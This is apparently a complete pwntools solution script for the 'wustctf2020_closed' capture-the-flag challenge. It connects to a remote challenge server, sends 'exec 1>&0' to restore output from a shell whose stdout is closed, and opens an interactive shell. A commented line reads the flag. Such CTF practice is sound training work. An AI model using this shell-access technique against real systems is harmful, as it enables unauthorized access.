#coding:utf-8
from pwn import *
sh = process("./wustctf2020_closed")
sh = remote("node3.buuoj.cn",25671)
sh.sendline("exec 1>&0")
#sh.sendline("cat flag >&0")
sh.interactive()